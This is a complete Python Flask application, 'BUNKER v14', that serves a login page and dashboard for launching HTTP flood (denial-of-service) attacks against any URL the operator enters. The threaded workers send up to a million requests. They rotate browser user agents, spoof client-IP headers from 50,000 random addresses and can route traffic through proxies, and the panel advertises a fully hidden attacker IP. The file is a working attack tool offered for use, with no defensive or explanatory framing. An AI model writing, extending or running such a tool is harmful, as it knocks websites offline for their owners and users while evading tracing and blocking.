from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
attack_counters = {}

# 50000 FAKE IPs
FAKE_IPS = [f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}" for _ in range(50000)]

# BROWSER USER AGENTS
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Version/17.0 Safari/605.1.15",
]

custom_proxies = []
proxy_enabled = False

# ============================================
# 🔥 100% REAL BROWSER-LIKE REQUEST
# ============================================
def send_real_request(url, use_proxy=False):
    """Sends request EXACTLY like a real browser"""
    try:
        fake_ip = random.choice(FAKE_IPS)
        ua = random.choice(USER_AGENTS)
        
        # REAL BROWSER HEADERS
        headers = {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "CF-Connecting-IP": fake_ip,
        }
        
        proxies = None
        if use_proxy and custom_proxies:
            p = random.choice(custom_proxies).strip()
            p = p.replace("socks5://", "").replace("socks4://", "").replace("http://", "").replace("https://", "")
            proxies = {"http": f"http://{p}", "https": f"http://{p}"}
        
        # SEND REQUEST - JUST LIKE BROWSER
        response = requests.get(
            url,
            headers=headers,
            proxies=proxies,
            timeout=30,
            allow_redirects=True,
            verify=False
        )
        
        return True
        
    except Exception as e:
        return False

def attack_worker(attack_id, url, count, mode):
    success = 0
    fail = 0
    
    for i in range(count):
        if attack_id not in active_attacks:
            break
        
        use_proxy = (mode in ["proxy", "all"]) and proxy_enabled and custom_proxies
        
        result = send_real_request(url, use_proxy)
        
        if result:
            success += 1
            attack_stats["success"] += 1
        else:
            fail += 1
            attack_stats["failed"] += 1
        
        attack_stats["total"] += 1
        
        if attack_id in attack_counters:
            attack_counters[attack_id] = {
                "done": i+1, "total": count,
                "success": success, "fail": fail
            }

def run_attack(attack_id, url, count, speed, mode):
    workers = {"slow": 10, "fast": 30, "ultra": 60, "flash": 100, "god": 200}.get(speed, 30)
    req_per_worker = max(1, count // workers)
    
    attack_logs.append(f"🔥 {url[:50]}... | {count} | {speed.upper()} | {workers}W")
    attack_counters[attack_id] = {"done": 0, "total": count, "success": 0, "fail": 0}
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(attack_worker, attack_id, url, req_per_worker, mode) for _ in range(workers)]
        for future in as_completed(futures):
            try: future.result(timeout=600)
            except: pass
    
    if attack_id in active_attacks: del active_attacks[attack_id]

# ============================================
# 🎨 UI
# ============================================
LOGIN = """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>BUNKER v14</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:system-ui}
.box{background:#0a0000;padding:40px;border-radius:18px;border:2px solid #f00;width:380px;text-align:center;box-shadow:0 0 60px rgba(255,0,0,0.3)}
h1{color:#f00;font-size:1.8em;letter-spacing:3px}
input{width:100%;padding:14px;background:#000;border:1px solid #f00;border-radius:10px;color:#f44;margin:8px 0;font-size:14px;font-family:monospace}
input:focus{border-color:#0f0;outline:none}
.btn{width:100%;padding:16px;background:#c00;color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:15px;margin-top:10px;letter-spacing:2px}
.btn:hover{background:#f00}
</style></head><body>
<div class="box">
<h1>💀 BUNKER v14</h1>
<p style="color:#888;font-size:0.6em;margin:10px 0">REAL REQUESTS • FAKE IP • 200 RPS</p>
<form method="post">
<input type="text" name="user" placeholder="Username" autocomplete="off">
<input type="password" name="pass" placeholder="Password">
<button class="btn" type="submit">☠️ ACCESS</button>
</form>
{% if error %}<p style="color:#f00;margin-top:8px">{{ error }}</p>{% endif %}
</div>
</body></html>"""

DASH = """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>BUNKER v14</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#ddd;font-family:system-ui;padding:10px}
.container{max-width:1000px;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:15px 20px;border:2px solid #f00;border-radius:12px;margin-bottom:15px;background:#0a0000;flex-wrap:wrap;gap:10px}
.header h1{color:#f00;font-size:1.3em}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:15px}
.stat{background:#0a0000;border:1px solid #300;border-radius:10px;padding:15px;text-align:center}
.stat-val{font-size:2em;font-weight:700}.s{color:#0f0}.f{color:#f00}.t{color:#ff0}
.stat-label{font-size:0.55em;color:#666;letter-spacing:2px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:15px}
.card{background:#0a0000;border:1px solid #300;border-radius:12px;padding:18px}
.card h3{color:#f44;margin-bottom:12px;font-size:0.8em;letter-spacing:1px}
input,select,textarea{width:100%;padding:10px;background:#000;border:1px solid #f00;border-radius:8px;color:#f44;margin:4px 0;font-size:12px;font-family:monospace}
textarea{resize:vertical;min-height:50px}
label{font-size:0.55em;color:#888;display:block;margin-top:6px;letter-spacing:1px}
.btn{width:100%;padding:12px;background:#c00;color:#fff;border:none;border-radius:8px;font-weight:700;cursor:pointer;margin:3px 0;font-size:0.75em;letter-spacing:1px}
.btn:hover{background:#f00}
.btn-green{background:#0a0}
.btn-stop{background:#222;color:#f00;border:1px solid #f00}
.btn-god{background:#f80;color:#000;font-size:0.85em;padding:14px}
.row{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.logs{background:#000;border:1px solid #300;border-radius:8px;padding:10px;max-height:200px;overflow:auto;font-size:0.6em;font-family:monospace;color:#0f0}
.log-e{padding:2px 0;border-bottom:1px solid #111;color:#aaa}
.counter{font-size:1.2em;color:#ff0;text-align:center;padding:10px;font-family:monospace;background:#0a0000;border-radius:8px;margin-top:8px}
</style></head><body>
<div class="container">
<div class="header">
<div><h1>💀 BUNKER v14</h1><div style="color:#888;font-size:0.5em">REAL REQUESTS • FAKE IP • 200 RPS</div></div>
<a href="/logout" style="color:#f00;text-decoration:none;font-size:0.7em">EXIT</a>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">FAILED</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">TOTAL</div></div>
</div>

<div class="grid">
<div class="card">
<h3>🎯 ATTACK</h3>
<label>URL</label><input type="text" id="url" placeholder="https://target.com">
<div class="row"><div><label>REQUESTS</label><input type="number" id="count" value="1000"></div><div>
<label>SPEED</label><select id="speed"><option value="slow">Slow (10w)</option><option value="fast" selected>Fast (30w)</option><option value="ultra">ULTRA (60w)</option><option value="flash">FLASH (100w)</option><option value="god">GOD (200w)</option></select></div></div>
<label>MODE</label><select id="mode"><option value="direct">DIRECT (Fake IP)</option><option value="proxy">PROXY (Custom)</option><option value="all">DIRECT + PROXY</option></select>
<label>PROXIES</label><textarea id="proxies" placeholder="socks5://ip:port&#10;http://ip:port"></textarea>
<button class="btn btn-green" onclick="saveProxies()">SAVE PROXIES</button>
<button class="btn btn-god" onclick="start()">⚡ LAUNCH</button>
<button class="btn btn-stop" onclick="stop()">⏹️ STOP</button>
<div class="counter" id="liveCounter">READY</div>
</div>

<div class="card">
<h3>📊 INFO</h3>
<div style="color:#0f0;font-size:0.65em;line-height:2;text-align:center">
🔒 REAL BROWSER HEADERS<br>
🛡️ 50000 FAKE IPs<br>
⚡ GOD: 200 REQUESTS/SEC<br>
💀 IP 100% HIDDEN
</div>
</div>
</div>

<div class="card"><h3>LOGS</h3><div class="logs" id="logs"><div class="log-e">💀 BUNKER v14 READY</div></div></div>
</div>

<script>
var ci=null,lt=0,ltm=Date.now();

function saveProxies(){fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:document.getElementById('proxies').value})}).then(r=>r.json()).then(d=>alert('✅ '+d.count+' Proxies'))}

function u(){fetch('/stats').then(r=>r.json()).then(d=>{
document.getElementById('success').textContent=d.success;
document.getElementById('failed').textContent=d.failed;
document.getElementById('total').textContent=d.total})}

function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}

function c(){fetch('/counter').then(r=>r.json()).then(d=>{if(d.active)document.getElementById('liveCounter').textContent='⚡ '+d.done+'/'+d.total+' [✅'+d.success+']';else document.getElementById('liveCounter').textContent='READY'})}

function start(){
var u=document.getElementById('url').value;
var c=document.getElementById('count').value;
var s=document.getElementById('speed').value;
var m=document.getElementById('mode').value;
if(!u){alert('Enter URL!');return}
fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:u,count:parseInt(c),speed:s,mode:m})}).then(r=>r.json()).then(d=>{l();u();if(ci)clearInterval(ci);ci=setInterval(c,200)})}

function stop(){fetch('/stop',{method:'POST'}).then(()=>{if(ci){clearInterval(ci);ci=null}document.getElementById('liveCounter').textContent='STOPPED';l()})}

setInterval(()=>{l();u()},1000)
</script></body></html>"""

# ============================================
# ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="ACCESS DENIED")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return DASH

@app.route('/save_proxies', methods=['POST'])
def save_proxies():
    global custom_proxies, proxy_enabled
    raw = request.get_json().get('proxies','')
    custom_proxies = [p.strip() for p in raw.replace('\r\n','\n').split('\n') if p.strip() and ':' in p]
    proxy_enabled = len(custom_proxies) > 0
    return jsonify({"status":"ok","count":len(custom_proxies)})

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    url = d.get('url','')
    count = min(int(d.get('count',100)),1000000)
    speed = d.get('speed','fast')
    mode = d.get('mode','direct')
    if not url: return jsonify({"error":"URL required"}),400
    
    for k in list(active_attacks.keys()): del active_attacks[k]
    
    aid = f"atk_{int(time.time())}"
    active_attacks[aid] = True
    
    t = threading.Thread(target=run_attack, args=(aid,url,count,speed,mode))
    t.daemon=True; t.start()
    return jsonify({"status":"started"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/counter')
def counter():
    for aid in active_attacks:
        if aid in attack_counters:
            return jsonify({"active":True,**attack_counters[aid]})
    return jsonify({"active":False})

@app.route('/logs')
def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats(): return jsonify(attack_stats)

@app.route('/logout')
def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    print("💀 BUNKER v14 - REAL REQUESTS")
    import os
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
